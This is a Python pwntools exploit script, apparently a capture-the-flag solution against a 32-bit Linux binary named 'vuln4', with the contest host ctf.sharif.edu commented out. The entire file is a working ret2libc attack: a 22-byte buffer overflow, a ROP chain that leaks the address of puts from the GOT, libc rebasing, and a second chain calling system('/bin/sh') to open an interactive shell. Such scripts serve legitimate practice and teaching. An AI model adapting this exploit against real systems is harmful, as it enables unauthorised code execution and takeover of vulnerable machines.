#!/usr/bin/env python

from pwn import *
import struct

context(arch = 'x86', os = 'linux', endian = 'little', word_size = 32, log_level = 'info')

HOST = 'ctf.sharif.edu'
PORT = 4801
# p = remote(HOST, PORT)

p = process('./vuln4')
elf = ELF('./vuln4')
libc = ELF('libc.so.6')

rop = ROP(elf)

rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

print rop.dump()

payload = "A"*22
payload += str(rop)

print p.recvuntil("You should find puts yourself")
p.sendline(payload)
leak = p.recvuntil("You should find puts yourself") # => leak puts

leaked_puts = leak[1:5].strip()
leaked_puts = struct.unpack('I', leaked_puts)[0]

log.info("PUTS: " + str(hex(leaked_puts)))

# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
log.info("LIBC: " + str(hex(libc.address)))

rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')))
# rop2.call(elf.symbols['main'])

print rop2.dump()

payload = "A"*22
payload += str(rop2)

p.clean()
p.sendline(payload)

print "[+] Enjoy your shell"
p.interactive()
# print p.recvuntil("done!")

# print rop.dump()
p.close()
